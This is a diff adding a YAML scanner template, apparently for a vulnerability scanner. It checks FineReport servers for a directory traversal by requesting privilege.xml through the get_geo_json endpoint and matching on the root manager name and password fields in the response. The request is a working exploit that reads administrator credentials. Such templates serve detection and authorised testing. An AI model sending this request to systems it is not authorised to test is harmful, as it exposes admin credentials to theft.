@@ -1,0 +1,16 @@
+id: finereport-directory-traversal
+
+info:
+  name: Finereport Directory Traversal
+  author: l1nk3r
+  severity: high
+  tags: finereport,directory-traversal
+  created: 2023/11/14
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    expression: response.status == 200 && response.body.bcontains(b"<rootManagerName>") && response.body.bcontains(b"<rootManagerPassword>")
+expression: r0()
